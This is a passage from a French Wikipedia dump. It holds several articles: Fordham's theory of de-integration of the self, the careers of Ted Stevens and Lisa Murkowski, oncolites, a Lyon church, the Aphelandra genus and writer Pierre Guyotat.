Quand tout se passe bien cette dé-intégration et l'activité psycho-motrice du bébé qu'elle initie aboutit à ce que se crée une nouvelle homéostasie, cette fois dans la relation du bébé et de son environnement. Ainsi ce dernier prend la qualité de «self object» (voir aussi objet primaire), le nourrisson n'étant pas encore en mesure de différencier ce qui est de lui et de son environnement. Par la suite, et progressivement, le self object se différenciera petit à petit, jusqu'à, souvent, se limiter à un seul objet, alors très proche de ce que Donald Winnicott a appelé objet transitionnel.
La ré-intégration.
Une fois l'équilibre homéostatique retrouvé par le bébé en relation avec son environnement, la ré-intégration pourra avoir lieu, c'est-à-dire les retrouvailles avec un état d'homéostasie interne dont le prototype est le sommeil retrouvé du bébé. Mais la ré-intégration ne se limite pas à un simple retour à l'état de soi primaire. Le bébé intègre aussi une part plus ou moins importante des conditions, internes autant qu'externes, qui ont présidé à cette ré-intégration. Ainsi le monde interne du bébé se différencie petit à petit, alors que, dans le même temps, il peut éprouver progressivement quelques différences entre intérieur et extérieur, en même temps que se constituent les premiers îlots du moi, c'est-à-dire d'une conscience réflexive.
Synthèse.
Le modèle que j’ai commencé à formuler en 1947 a été développé jusqu’à ce jour comme suit : Le soi primaire ou originel de l’infans est radicalement perturbé par la naissance, naissance où l’ensemble psyché-soma est inondé de stimuli qui sont la source de l’émergence d’une anxiété prototypique. À la suite de ceci, un équilibre se rétablit et le premier enchaînement clair de déséquilibre suivi d’un nouvel équilibre est accompli. Cette séquence se répète encore et encore pendant la maturation et les forces qui la sous-tendent sont appelées dé-intégratives et ré-intégratives.
En d’autres termes le petit d’homme vient au monde comme empli d’une demande qui ne peut se reconnaître comme telle qu’à la mesure où il en recevra une réponse suffisamment satisfaisante. C’est ainsi à la mesure de cette réponse qu’il pourra se vivre comme sujet de sa demande, sujet de lui-même donc, ce qui fera de lui un être humain parmi d’autres humains. Tel est le processus originaire décrit par Fordham comme dé-intégration et ré-intégration du soi, processus par lequel le soi passe de l’état primaire à l’état humain où il se trouve alors en lien avec le moi naissant du tout petit.
Les défenses du soi.
Le clivage du soi.
Si, lors de la dé-intégration, le bébé ne peut établir, dans sa relation avec son environnement maternant, une homéostasie suffisante, alors la ré-intégration ne peut avoir lieu : une part du soi reste en état dé-intégré, et la ré-intégration n'est que partielle. L'exemple le plus commun est celui de la différence qu’il y a entre un bébé qui pleure avant de s’endormir et de retrouver un état de sérénité, et un bébé qui, après avoir pleuré normalement, se met à changer de tonalité, exprimant quelque chose que nous, adultes, ressentons comme de la détresse; ce bébé ne peut finalement s’endormir qu’après avoir atteint un état d’épuisement total.
Si cette expérience se répète trop, si elle dépasse un certain seuil (très variable selon les bébés), ce type d’expérience peut être vécu comme menaçant l’existence même, de telle sorte que le soi se défend en se clivant : la part dé-intégrée n’est alors plus traitée comme part de soi-même, et le geste spontané devient figé.
Le soi gelé.
Quand le clivage du soi devient massif, c'est l'ensemble de l'activité psycho-motrice de l'enfant qui se fige, ce qui a amené Fordham à parler du « soi gelé » dans ses travaux sur l'autisme.
Une telle approche de l'autisme ne contredit pas les travaux entamés depuis la fin du sur les origines génétiques et/ou neurobiologiques de l'autisme, mais permet de modéliser les conséquences psychiques d'une carence importante de l'environnement du bébé, carence alors mesurée au regard des besoins spécifiques de chaque bébé. C'est ainsi que l'on peut constater que certains bébés deviennent autistes dans un environnement pourtant satisfaisant au regard des normes et usages d'une culture donnée. L'hypothèse d'une origine génétique et/ou neurobiologique prend alors toute sa valeur pour comprendre la variabilité des réponses des bébés à l'environnement qui est le leur, et le destin pathologique du développement de certains d'entre eux. Dans le même temps l'approche conceptuelle de Fordham permet de rendre compte de l'influence importante de l'environnement maternant, d'une part pour certains cas d'autisme qui résultent de carences objectives de cet environnement, et d'autre part dans la prise en charge des enfants malades.
Prix Michael Fordham.
Depuis 1996, la revue britannique "Journal of Analytical Psychology" décerne chaque année un prix pour un article clinique qu'elle a publié. Les lauréats en ont été successivement Giles Clark, Georges Bright, Hester Mc Farland Solomon, Mara Sidoli, James Astor, Gustav Bovensiepen, Marcus West, Judith Woodhead, Margaret Wilkinson, François Martin-Vallas, Jean Knox, Richard Carvalho, Marica Rytovaara, Martin Schmidt.

</doc>
<doc id="248681" url="https://fr.wikipedia.org/wiki?curid=248681" title="Ted Stevens">
Ted Stevens

Theodore Fulton Stevens, dit Ted Stevens, né le à Indianapolis (Indiana) et mort le dans la région de recensement de Dillingham (Alaska), est un homme politique américain. Membre du Parti républicain, il est sénateur des États-Unis pour l'Alaska de 1968 à 2009.
Il meurt dans un accident d'avion en 2010 à environ au nord-ouest d'Aleknagik.
Biographie.
Theodore Fulton Stevens naît le à Indianapolis, dans l'Indiana.
Durant la Seconde Guerre mondiale, il est pilote en Chine dans l'armée de l'air avec le grade de lieutenant.
Après la guerre, il obtient sa licence (baccalauréat universitaire) à université de Californie à Los Angeles et fait ses études de droit à l'université Harvard, puis il s'installe au début des années 1950 dans le territoire de l'Alaska à Fairbanks où il est nommé procureur général en 1953.
En 1956, Stevens rejoint Washington D.C. en tant que conseiller légal et assistant du secrétaire d'État à l'Intérieur, , où il défend le principe du changement de statut de l'Alaska et d'Hawaï, lesquels deviennent des États en 1959.
En 1960, le président Dwight D. Eisenhower le nomme en tant que juriste au Département de l'Intérieur. De retour en Alaska, Stevens reprend son métier d'avocat à Anchorage.
En 1964, il est élu à la Chambre des représentants de l'Alaska puis devient chef de la majorité républicaine lors de son second mandat. En décembre 1968, le gouverneur de l'Alaska, Walter Hickel, le nomme sénateur au Congrès fédéral après la mort du titulaire . En 1970, les électeurs confirment Stevens pour terminer le mandat de Bartlett.
Il est réélu à six reprises en , 1978, 1984, 1990, 1996 et 2002.
Sénateur, Stevens a participé à de nombreuses commissions sénatoriales dont celles des affaires gouvernementales ou au comité d'éthique. Il a cherché depuis le début des années 1980 à autoriser l'exploration pétrolière dans un des vastes parcs nationaux de son État. Depuis l'arrivée de George W. Bush à la Maison-Blanche, il avait espoir que cette exploration pétrolière aboutirait. Or, à plusieurs reprises, son amendement est bloqué par une petite majorité de ses collègues du Sénat alliant quelques républicains aux démocrates, sensibles aux arguments des défenseurs de la virginité d'une région arctique à peu près inhabitée. Stevens justifie sa position par le besoin qu'ont les États-Unis de diversifier leurs sources d'approvisionnement énergétique.
En 2003, le journal "Los Angeles Times" l'accuse d'enrichissement personnel dans le cadre de ses fonctions : il est inculpé en juillet 2008 pour avoir bénéficié sans les déclarer, entre 1999 et 2006, de cadeaux et de services d'une entreprise énergétique pour un total de plus de , afin notamment d'effectuer des travaux à son domicile. Il est jugé coupable par un jury fédéral des 7 chefs d'accusations en octobre 2008. Il fait alors appel, affirmant que des avaient été cachées et qu'un témoin à décharge n'avait pas été entendu.
Bien qu'âgé de et condamné par la justice, il est candidat alors à un de sénateur aux élections du . D'abord donné gagnant de justesse, c'est après recomptage et prise en compte des votes par correspondance qu'il doit s'incliner par avec 46,6 % des suffrages devant le maire démocrate d’Anchorage, Mark Begich (47,7 %).
En avril 2009, constatant que des informations n'avaient pas été communiquées à la défense durant le procès de Stevens, le ministre américain de la Justice Eric Holder, suivant la décision du juge fédéral , abandonne, pour vice de procédure, toutes les charges qui avaient conduit à la condamnation de Ted Stevens.
Le , il avait survécu à un accident d'avion à l'aéroport d'Anchorage, dans lequel sa première épouse avait trouvé la mort. Ted Stevens meurt le dans l'accident d'un avion monomoteur à hélice, de type DeHavilland DHC-3T, qui s'est écrasé à environ au nord-ouest d'Aleknagik, située dans la région de recensement de Dillingham, en Alaska.
Hommages.
L'aéroport international d'Anchorage Ted-Stevens porte son nom ("Ted Stevens Anchorage International Airport").

</doc>
<doc id="248684" url="https://fr.wikipedia.org/wiki?curid=248684" title="Éruption">
Éruption

Le terme éruption peut désigner :

</doc>
<doc id="248687" url="https://fr.wikipedia.org/wiki?curid=248687" title="Oncolithe">
Oncolithe

Un oncolithe (ou oncolite) (du grec "onkos", nodule ou tumeur, et "lithos", pierre) est une roche calcaire formée à plus de 50 % d'oncoïdes. Les oncolithes sont généralement arrondis ou aplatis (en forme de galets). De telles roches se sont typiquement formées en milieu marin peu profond, avec ou sans l'intervention de bactéries. Les oncolithes peuvent être ferrugineux.
Confusions possibles.
La littérature scientifique des années 1970-1980 a abondamment utilisé "oncolite" pour "oncoïde". Le mélange des termes se retrouve encore parfois dans la littérature scientifique et de vulgarisation d’aujourd’hui.
Par ailleurs, les "oncolithes" peuvent être confondus avec des stromatolithes, qui sont entièrement construits par des colonies bactériennes, et qui sont aussi constituées de couches concentriques emboîtées les unes dans les autres.
Mode de formation.
Ces structures semblent toujours se former à proximité d'un littoral ou sur un banc, près de la surface, dans une eau agitée, par accrétion ou cristallisation en pellicules successives de molécules et particules présentes dans l'eau autour d'un noyau (nucléus), qui peut être un reste d'organisme vivant (coquille par exemple) ou un minéral ( fragment de calcaire). Ces structures se formeraient d'abord en suspension dans l'eau avant de couler et d'être enfouies dans les sédiments après avoir grossi.

</doc>
<doc id="248691" url="https://fr.wikipedia.org/wiki?curid=248691" title="Hectagone">
Hectagone



</doc>
<doc id="248698" url="https://fr.wikipedia.org/wiki?curid=248698" title="Église Saint-Georges de Lyon">
Église Saint-Georges de Lyon

L'église Saint-Georges de Lyon est un lieu de culte catholique situé dans l'ensemble de quartiers qualifiés de Vieux Lyon. Cette église dépend de la paroisse de la primatiale Saint-Jean de Lyon. Elle est dédiée au saint chrétien Georges de Lydda.
La seconde église, fondée par Leidrade, a donné son nom au quartier environnant. L'édifice actuel, de style néogothique, fut construit par l'architecte Pierre Bossan en 1844-1845. 
Localisation.
L'église Saint-Georges est située entre le quartier de la Quarantaine et le quartier Saint-Jean, à proximité de la place Benoît-Crépu, son ouverture sur le quai rappelant l'existence jusqu'au du Port Sablet, et de la place Bertras. Elle occupe l'ancien emplacement de la commanderie des chevaliers de l'ordre de Saint-Jean de Jérusalem.
Histoire.
Moyen Âge.
Le premier édifice ecclésial sur le site de l'église saint-Georges actuel est fondé par Sacerdos au . Il y fonde un lieu de culte sous le vocable de Sainte Eulalie et, non loin au sud, un monastère de religieuses lié à l'église. 
L'église semble abîmée par les vagues sarrasines du . Elle est restaurée par Leidrade autour des années 800. L'église est alors dédiée à saint Georges. Les fouilles permettent d'estimer que l'église actuelle se situe à l'emplacement des églises primitives.
Aux , l'église est entourée par le cimetière de la paroisse de Saint-Georges, sur les faces nord, .
Les chevaliers de l'ordre de Saint-Jean de Jérusalem arrivent à Lyon au début du et s'installent en 1315 dans l'ancien monastère attenant à l'église. Celle-ci reste une église paroissiale mais est rattachée à la commanderie.
Renaissance.
À la fin du , l'église est restaurée. En 1492, l'hôtel de la commanderie est construit non loin par Humbert de Beauvoir et il en profite pour remettre en état l'église Saint-Georges. Il fait refaire l'extrémité du chœur et embellit l'ensemble du bâtiment. Il fait apposer ses armes dans l'église : écartelé d'or et de gueules, ainsi que celles de l'ordre.
Histoire contemporaine.
Reconstruction.
En 1792, les églises sont fermées et les prêtres non jureurs pourchassés, par décision du maire de Lyon, Louis Vitet : non entretenue, l’église Saint Georges se détériore rapidement. Le , le clocher s’effondre en partie.
Décrétée bien national, la Commanderie est occupée par divers locataires, avant d’être vendue, en 1807. Un incendie survient en 1854 et l’immeuble est détruit en 1857 ; en 1884, un groupe scolaire est édifié à sa place.
L'église est reconstruite à partir de 1842.
Célébration du rite lyonnais.
. La Fraternité célèbre la messe dans le rite lyonnais, en application du motu proprio "Ecclesia Dei" de 1988.
La paroisse redevient diocésaine , désormais desservie par d’anciens prêtres de la fraternité Saint-Pierre ayant rejoint l'archidiocèse.
Le , le cardinal Barbarin signe l'incardination de trois des cinq prêtres desservant cette église. Le , à la suite des travaux de réfection de l'extérieur de l'église et des places attenantes, l'inauguration de l'église a lieu en présence du cardinal Barbarin et du sénateur-maire de Lyon Gérard Collomb.

</doc>
<doc id="248701" url="https://fr.wikipedia.org/wiki?curid=248701" title="Peine">
Peine



</doc>
<doc id="248705" url="https://fr.wikipedia.org/wiki?curid=248705" title="Aphelandra">
Aphelandra

Aphelandra est un genre de plantes à fleurs de la famille des Acanthacées, qui comprend environ . Ce sont des arbustes ou des sous-arbrisseaux originaires des régions subtropicales à tropicales d'Amérique.
Liste des espèces.
Selon "The Plant List" 
Selon :
Espèces aux noms synonymes, obsolètes et leurs taxons de référence.
Selon "The Plant List" 
Espèces au statut non encore résolu.
Selon "The Plant List" 

</doc>
<doc id="248706" url="https://fr.wikipedia.org/wiki?curid=248706" title="Pierre Guyotat">
Pierre Guyotat

Pierre Guyotat, né le à Bourg-Argental (Loire) et mort le à Paris, est un écrivain et dramaturge français. Dans son œuvre, qui fait toujours scandale, il invente un monde de sexe et de guerre et des formes nouvelles d'expression.
Biographie.
Jeunesse.
Né d'un père médecin de campagne, à Bourg Argental (Loire), et d'une mère née en Pologne près de Cracovie, Pierre Guyotat fait des études secondaires dans des pensionnats catholiques, après une petite enfance marquée par l'engagement souvent tragique de membres de sa famille dans la Résistance et dans la France libre. En même temps qu'il peint, il commence à écrire à l'âge de 14 ans. À 16 ans, il envoie ses poèmes à René Char, qui lui répond et l'encourage. À 19 ans, encore mineur, un an après la mort de sa mère, il s'enfuit à Paris où, tout en continuant d'écrire, il fait plusieurs petits métiers. Il envoie un premier texte à Jean Cayrol qui en perçoit aussitôt la valeur prémonitoire.
Pierre Guyotat est le neveu du psychanalyste Jean Guyotat (1920-2017), de Philippe Viannay ainsi que de Suzanne Guyotat.
Œuvre.
En 1960, Pierre Guyotat écrit sa première fiction, "Sur un cheval". Le livre est publié au Seuil en 1961 dans la collection « Écrire », créée et dirigée par Jean Cayrol, où l'on trouve aussi les premiers textes de Philippe Sollers, de Régis Debray.
Il est appelé en Algérie en 1960. Au printemps 1962, il est arrêté, interrogé pendant dix jours par la Sécurité militaire et inculpé d’atteinte au moral de l’armée, de complicité de désertion et de possession de livres et de journaux interdits. Après trois mois de cachot « au secret », il est transféré dans une unité disciplinaire. De retour à Paris, lecteur aux éditions du Seuil, il publie aussi des articles dans "Arts et spectacles" puis dans "France Observateur" où il entre en 1964 comme responsable des pages culturelles de l'hebdomadaire qui devient "Le Nouvel Observateur".
En 1964, il publie "Ashby" (Le Seuil).
Il travaille alors à "Tombeau pour cinq cent mille soldats", dont il rédige la deuxième partie en Bretagne, à Raguénez en Névez, dans la maison de son grand-oncle Charles Viannay, chirurgien, ami de Georges Duhamel depuis la Première Guerre mondiale et dédicataire de "Civilisation". Refusé par les éditions du Seuil, "Tombeau pour cinq cent mille soldats" paraît aux éditions Gallimard en 1967. Après un article élogieux en 1969 de Catherine Claude, dans "La Nouvelle Critique", revue théorique du Parti communiste, le livre connaît un grand retentissement, du fait de son écriture, et sans doute aussi parce qu'il mêle sexe et guerre. Jean Paulhan écrit : Michel Foucault : Le général Massu fait interdire le livre dans les casernes françaises en Allemagne.
Guyotat se lie d'amitié avec Philippe Sollers et Jacques Henric et fréquente le groupe "Tel Quel", dont il se détachera peu à peu à partir de 1973. Par l'intermédiaire de Jacques Henric, à la même époque, il se liera d'amitié aussi avec Catherine Millet. 
Aussi, à la même époque, Pierre Guyotat s'intéressera à l'art contemporain, et surtout aux artistes dits d'« avant-garde » qui apportent un souffle nouveau à l'art. 
En juillet 1967, il est invité par Fidel Castro à Cuba, avec Michel Leiris, Marguerite Duras et d'autres, au moment de la Conférence latino-américaine de Solidarité ; il y rencontre de nombreux artistes, intellectuels et leaders révolutionnaires du monde entier.
Arrêté deux fois pendant les événements de mai 1968, au cours desquels il participe avec Jean-Pierre Faye, Nathalie Sarraute, Michel Butor et d'autres, à la création de l'Union des écrivains de France, il adhère au Parti communiste, après avoir entendu un discours du général de Gaulle accusant ce parti de subversion. Il en démissionne en 1972.
Un poème de Pierre Guyotat, illustré par le peintre cubain Wifredo Lam, paraît dans le cahier "Insolation" aux éditions Fata Morgana en décembre 1968.
De 1967 à 1975, il fait de nombreux séjours et trajets en Algérie et au Sahara. En 1969, il fait la connaissance de Paule Thévenin, amie d'Antonin Artaud et éditrice de ses œuvres complètes.
En 1970 a lieu, chez Gallimard, la parution éditorialement mouvementée d’"Éden, Éden, Éden" préfacé par Michel Leiris, Roland Barthes et Philippe Sollers. Le livre est aussitôt interdit par le ministère de l'Intérieur à l’affichage, à la publicité et à la vente aux mineurs. Une pétition de soutien internationale à l’ouvrage est signée (notamment par Pier Paolo Pasolini, Jean-Paul Sartre, Pierre Boulez, Joseph Beuys, Pierre Dac, Jean Genet, Joseph Kessel, Maurice Blanchot, Max Ernst, Italo Calvino, Jacques Monod, Simone de Beauvoir, Nathalie Sarraute…). François Mitterrand, dans une communication orale à l'Assemblée, et Georges Pompidou, alors président de la République, dans une lettre à son ministre de l'Intérieur Raymond Marcellin, interviennent en faveur de l’ouvrage, mais l’interdiction n’est pas levée. Le jury du prix Médicis, à une voix près, couronne un autre livre et Claude Simon (futur prix Nobel 1985), membre du jury et grand soutien de l'œuvre de Pierre Guyotat, démissionne. L'interdiction du livre n'est levée qu'en novembre 1981.
En 1973, sa pièce de théâtre "Bond en avant" est créée aux Rencontres internationales de musique contemporaine de La Rochelle avec Christian Rist et Marcel Bozonnet, Jean-Baptiste Malartre, Saïd Boussouar et François Kuki, et à La Cartoucherie de Vincennes avec Alain Ollivier et François Kuki seulement.
Durant les années 1970, Guyotat s'engage dans diverses actions : pour les comités de soldats, pour les immigrés (défense dans les journaux et au procès en assises de Mohammed Laïd Moussa inculpé d'homicide volontaire, assassiné après sa sortie de prison en mars 1975). Il soutient aussi le mouvement des prostituées de Lyon et participe à cette occasion avec des amis cinéastes à des tournages vidéos.
En 1975 paraît chez Gallimard "Prostitution", où il intègre finalement le texte de "Bond en avant". Ce livre marque le début d'une transformation de la langue. La même année, il écrit « Vive les bouchères de l'interdit » ("Libération", ), en soutien aux prostituées qui occupent l'église Saint-Nizier à Lyon, qu'il filme avec ses amis Carole et Paul Roussopoulos ("Les Prostituées de Lyon parlent", 1975). 
En 1976, il écrit, pour le catalogue de l'exposition de l'artiste allemand Klaus Rinke, élève de Joseph Beuys, à Paris, un texte qui, augmenté, deviendra "La Découverte de la logique".
De 1977 (première dépression nerveuse) à 1981, le travail sur "Le Livre" (Gallimard) et "Histoires de Samora Machel" (encore inédit) se répercute sur sa santé qui se dégrade. Début décembre 1981, au moment où "Tombeau pour cinq cent mille soldats" est joué dans une mise en scène d'Antoine Vitez, au Théâtre national de Chaillot, Guyotat, tombé dans le coma, est hospitalisé en réanimation à l'hôpital Broussais. Après une nouvelle période de dépression, il ne retrouve sa pleine santé qu'à l'été 1983. Il fera le récit de cette période critique dans "Coma" en 2006.
En 1984 paraissent "Le Livre" (Gallimard) et "Vivre", recueil de textes et d'entretiens, chez Denoël.
En 1986, Michel Guy, directeur du Festival d'automne, lui commande un texte pour le théâtre, "Bivouac", dans une mise en scène de l'auteur et d'Alain Ollivier, avec notamment Pascal Bongard. Pour ce festival Guyotat donne en 1989 et 1992 deux séries d'improvisations publiques.
Au printemps 1988, il travaille à Los Angeles avec le peintre américain Sam Francis à un livre d'artiste dont il écrit le texte : "Wanted Female". À la parution du livre, en 1996, la Bibliothèque nationale de France fait l'acquisition d'un exemplaire pour le département des Livres rares et précieux.
Il travaille à de nombreux textes inédits et, en 1991, commence la rédaction de "Progénitures", dont la première et la deuxième partie paraissent chez Gallimard en 2000 accompagnées d'un CD d'une lecture de l'auteur pour la réouverture du Centre Pompidou. 
En 2005, les éditions Léo Scheer publient le tome 1 (1962-1969) des "Carnets de bord".
Après "Coma" (Mercure de France, 2006), Guyotat écrit "Formation" (Gallimard, 2007), récit de ses premières années, dans lequel il revient longuement sur l'action de certains membres de sa famille dans la Résistance (Philippe Viannay et sa femme, Hélène, Suzanne Guyotat, Hubert Viannay).
En 2010 paraît "Arrière-fond" (Gallimard) : 
En 2014 est publié "Joyeux animaux de la misère" (Gallimard), texte de fiction qui met en scène une mégapole elle-même constituée de sept mégapoles dans l'une desquelles se trouve un district « chaud » et son bordel. Le récit des aventures de trois personnages est mené dans une langue de comédie, crue et enjouée. Une suite paraît en 2016 intitulée "Par la main dans les enfers" (Gallimard).
En 2016 paraît un livre d'entretiens avec Donatien Grau, intitulé "Humains par hasard" (Gallimard) puis, en 2018, le récit "Idiotie" (Grasset), couronné la même année par le prix Médicis. Ce livre est un âpre récit de sa jeunesse : ses années de grande misère à Paris, à la fin des années 1950, et surtout sa guerre d'Algérie, pendant laquelle il fut jeté au cachot pour « atteinte au moral de l'armée », puis envoyé dans une unité disciplinaire.
Ses dessins ont été exposés à Paris (galerie Azzedine Alaïa), Londres (galerie Cabinet), Los Angeles (The Box) et Bruxelles (galerie Xavier Hufkens).
Professorat.
De 2001 à 2004, Pierre Guyotat est nommé professeur associé à l'Institut d'études européennes de l'université Paris VIII. Il y fait des lectures commentées de textes de la littérature française et étrangère depuis le Moyen Âge jusqu'à Paul Claudel, devant des étudiants, étrangers principalement, de premier cycle.
Mort.
Il meurt à Paris dans la nuit du 6 au à Paris, à l’âge de 80 ans. 
Expositions, colloques, lectures, adaptations.
En 1975, à Bruxelles, Frédéric Flamand travaille sur des extraits d"'Éden, Éden, Éden" dans "Le Nu traversé", avec la troupe théâtrale Plan K.
Dans les années 1984-1986, il donne de nombreuses lectures performances du "Livre" en Europe et Amérique du Nord.
En 1989, Ludwig Trovato réalise le film "Pierre Guyotat : 52 minutes dans la langue", diffusé à la télévision dans l'émission "Océaniques".
En 1989, dans le cadre du festival d'automne à Paris, les improvisations publiques réalisées par Pierre Guyotat au Centre Pompidou (du 4 au ) sont filmées, de même qu'en 1992, dans le même cadre (du 21 au ).
Au printemps 1995, une exposition lui est consacrée à Londres, à la Cabinet Gallery.
En , après avoir rencontré Pierre Guyotat, le compositeur de musique expérimentale Frédéric Acquaviva sort le CD "Coma" (Publications Casus Belli), composition de 23 minutes pour 16 guitares électriques et la voix et texte de Pierre Guyotat (extraits de "Wanted Female"), qui fit l'objet d'une adaptation chorégraphique par Maria Faustino en 1996. 
En 1997, Pierre Guyotat écrit le texte d'un spectacle de danse de Bernardo Montet, "Issê Timossé", qu'il récite sur scène au milieu des danseurs (festival de Montpellier danse et Théâtre de la Ville, à Paris devant des publics mouvementés).
En 2000, Jean-Luc Godard, dans "De l'origine du ", projeté en ouverture du festival du Cannes, intègre un extrait du CD de "Progénitures".
Le , Pierre Guyotat lit, en plein air, les trente ou quarante dernières pages de "Progénitures" au CIPM de Marseille.
En 2005, lors d'un séjour au Japon, il fait une lecture de "Prostitution" avec la participation du danseur de buto et une autre avec les intermèdes des récitantes et musiciennes du Gidayu, épopée japonaise du Moyen Âge.
Les 11 et , un colloque international, intitulé "Pierre Guyotat : motricités", organisé par Catherine Brun, ponctué d'une lecture de textes par Denis Lavant, se tient à la Bibliothèque nationale de France (BnF ; université Paris 3 ; université Paris 7 ; UMR 7171). Les textes des interventions feront l'objet d'une publication dans la revue "Europe" (n° 961, ).
En 2008-2010, le metteur en scène et cinéaste Patrice Chéreau réalise une lecture-spectacle de "Coma" à Salonique, Rome puis Paris (théâtre de l'Odéon, musée du Louvre).
Pendant dix ans, le réalisateur Jacques Kébadian filme les interventions et les séances de travail de Pierre Guyotat. L'ensemble de ces films, conservés au département de l'audiovisuel de la BnF, fera l'objet d'un portail et d'un DVD, "Guyotat par l'image".
En , le metteur en scène Sébastien Derrey donne le spectacle "En vie (chemins dans la langue de Pierre Guyotat)" au Théâtre de l'Échangeur, à Bagnolet, à partir de "Progénitures" dont la langue est mise en contrepoint d'extraits de l'œuvre récente ("Formation", "Coma" et "Explications").
Il fait de nombreuses lectures de son œuvre et des émissions de radio (notamment sur la musique, à la demande de Bernard Comment).
En , Pierre Guyotat donne un texte, "Indépendance", pour le numéro du centenaire de "La Nouvelle Revue française". Ce texte, traduit en anglais (américain) par Noura Wedell sous le titre "Independence", paraît aux éditions Semiotext(e) (Los Angeles) à l'occasion d'une série de lectures-rencontres de l'auteur aux États-Unis, à New York, San Francisco et Los Angeles (avril-).
Le , Pierre Guyotat lit le début du chant IV du "De rerum natura", de Lucrèce, en latin, dans le cadre de la programmation culturelle autour de « Monumenta 2012. »
Le , Patrice Chéreau donne "Coma" au Florence Gould Hall de New York puis les 30, et , 2, 3 et à Montréal, au Théâtre du Nouveau Monde ». Il le reprend, le , dans le cadre du festival d'Avignon, à l'Opéra-Théâtre, dans une mise en scène de Thierry Thieû Niang.
Le , Pierre Guyotat lit "Indépendance" dans le grand auditorium de la BnF, à l'occasion des 40 ans d"'Art Press".
Du 16 au , Tal Beit Halachmi donne "Progénitures" au Théâtre de la Bastille, à Paris, dans le cadre du festival "Faits d'hiver".
En , Pierre Guyotat est l'invité du festival "Manifeste" de l'Ircam, à Paris : création de "Joyeux animaux de la misère" et de « Transgresser : hommage à Michel Foucault » .
En janvier-, un numéro de la revue "Critique" () lui est consacré : treize contributions, rassemblées par Donatien Grau, précédées de deux inédits, "La Prison" et "Parlerie du rat".
Du au , l'exposition « Pierre Guyotat, La Matière de nos œuvres », confrontant manuscrits, dessins et photographies de l'auteur à des œuvres d'artistes contemporains, se tient à la galerie Azzedine Alaïa, à Paris.
Du au , une série de rencontres et de lectures consacrées à Pierre Guyotat se déroulent à Berlin : lecture de "Herkunft" à l'occasion de la parution de la traduction allemande de "Formation", rencontre et discussion à la médiathèque de l'Institut français, lecture et discussion à l'occasion de la parution du du magazine "Diaphanes". Le du magazine paraît au printemps 2017, avec un texte de Michael Heitz, un entretien avec Donatien Grau, la traduction en anglais de "La Prison", la traduction en allemand d"'Indépendance" et la traduction en anglais d'extraits de "Joyeux animaux de la misère".
En 2017, une exposition de dessins de Pierre Guyotat, accompagnés du manuscrit du "Livre", se tient à la galerie Cabinet, à Londres. À cette occasion, un coffret est publié comprenant le vinyle de l'enregistrement du "Livre" par l'auteur, fin , et un livret d'accompagnement illustré. Simultanément, une édition de luxe de la traduction en anglais d"'Éden, Éden, Éden" (Graham Fox, 1995), revue et augmentée d'une postface de Paul Buck, paraît aux éditions Vauxhall&amp;Company. Deux dessins de Pierre Guyotat sont aussi exposés à ArtBasel sur le stand de la galerie Cabinet.
En , le texte "Depuis une fenêtre" paraît dans le de la revue "Lignes".
Le , à la galerie Azzedine Alaïa, à Paris, une lecture de "Tombeau pour cinq cent mille soldats" est organisée pour le cinquantième anniversaire de la parution du texte. Cette lecture était accompagnée d'un accrochage de dessins récents de Pierre Guyotat.
En 2018, une exposition de nouveaux dessins, intitulée « Mes figures ? » est organisée à la galerie-librairie Yvon Lambert, à Paris. La même année, l'exposition « Figuren und andere Stimmen. Pierre Guyotat » se tient à l'espace Diaphanes, à Berlin, à l'occasion de la parution des traductions en allemand de "Coma" et "Arrière-fond". Des dessins sont également exposés à la Villa Médicis, à Rome, dans l'exposition « Le Violon d'Ingres ».
Le , Nâzim Boudjenah (pensionnaire de la Comédie-Française) lit le début d"'Idiotie" dans la salle de lecture du département des manuscrits de la Bibliothèque nationale de France.
Du au , l'exposition « Scenes and stages » présente un large choix de dessins de Pierre Guyotat et de Christoph von Weyhe à la galerie The Box, à Los Angeles.
Du au , une exposition de dessins est organisée à la galerie Xavier Hufkens, à Bruxelles.
Le , une lecture intégrale de "Éden, Éden, Éden", paru cinquante ans auparavant, est réalisée à la librairie Les Cahiers de Colette, à Paris, tandis que des lectures d'extraits du texte et des performances sont organisées dans cinquante lieux à travers le monde.
Les 23 et 24 novembre 2022, un colloque international, "Pierre Guyotat et l'Algérie", organisé par Catherine Brun, Guillaume Fau et Donatien Grau, avec le soutien de l'Association Pierre Guyotat, rassemble chercheurs français et algériens à la Bibliothèque nationale de France et à l'Institut du monde arabe, à Paris. Le livre "Pierre Guyotat et l'Algérie" paraît aux éditions Diaphanes en 2023.
Œuvres.
Traductions.
L'œuvre de Pierre Guyotat est traduite en japonais, en anglais (Royaume-Uni/États-Unis), en russe, en espagnol (Mexique), en italien, en allemand et en néerlandais.
Voir aussi.
Archives.
En 2004, Pierre Guyotat a fait don de ses archives à la Bibliothèque nationale de France. Le fonds est conservé au département des Manuscrits et au département de l'Audiovisuel (enregistrements).
En 2021, Régis Guyotat fait don des dessins de Pierre Guyotat au Centre Pompidou, où ils sont conservés dans les collections de la Bibliothèque Kandinsky.

</doc>
<doc id="248709" url="https://fr.wikipedia.org/wiki?curid=248709" title="Lisa Murkowski">
Lisa Murkowski

Lisa Murkowski, née le à Ketchikan (Alaska), est une femme politique américaine, membre du Parti républicain et sénatrice de l'Alaska au Congrès des États-Unis depuis 2002.
Biographie.
Enfance et études.
Lisa Murkowski est la fille de Nancy et Frank Murkowski, dont la famille est d'origine polonaise. Elle étudie au lycée à Fairbanks. Elle est diplômée en économie de l'université de Georgetown en 1980, puis en droit de l'université Willamette en 1985. Elle est procureure à Anchorage de 1985 à 1998.
Vie personnelle.
Lisa Murkowski épouse Verne Martell en 1987. De ce mariage naissent deux garçons : Nicolas et Matthew.
Carrière politique.
Débuts en politique.
En 1998, elle est élue à la chambre des représentants de l'Alaska, puis réélue en 2000 et 2002. Elle est choisie pour devenir le chef de la majorité durant la session 2003-2004, mais elle démissionne lorsqu'elle devient sénatrice en .
Sénatrice des États-Unis.
Premier mandat.
En 2002, Frank Murkowski est élu gouverneur de l'Alaska. Il choisit sa fille pour le remplacer au Sénat, où il est en poste depuis . Lisa Murkowski est notamment préférée à Sarah Palin, très investie dans la campagne de son père. Elle est alors considérée comme une modérée, pouvant faire face à Tony Knowles, s'il venait à se présenter aux élections de 2004. En réaction, une pétition est lancée pour que les sièges vacants donnent lieu à une élection partielle et non plus une nomination par le gouverneur. En 2004, une initiative est adoptée par les Alaskains pour que le siège reste vacant jusqu'à une élection partielle.
Elle devient la première femme à représenter l'Alaska au Congrès des États-Unis et le premier sénateur né en Alaska. Lors de ce premier mandat, 95 % de ses votes coïncident avec les votes de son parti.
Deuxième mandat.
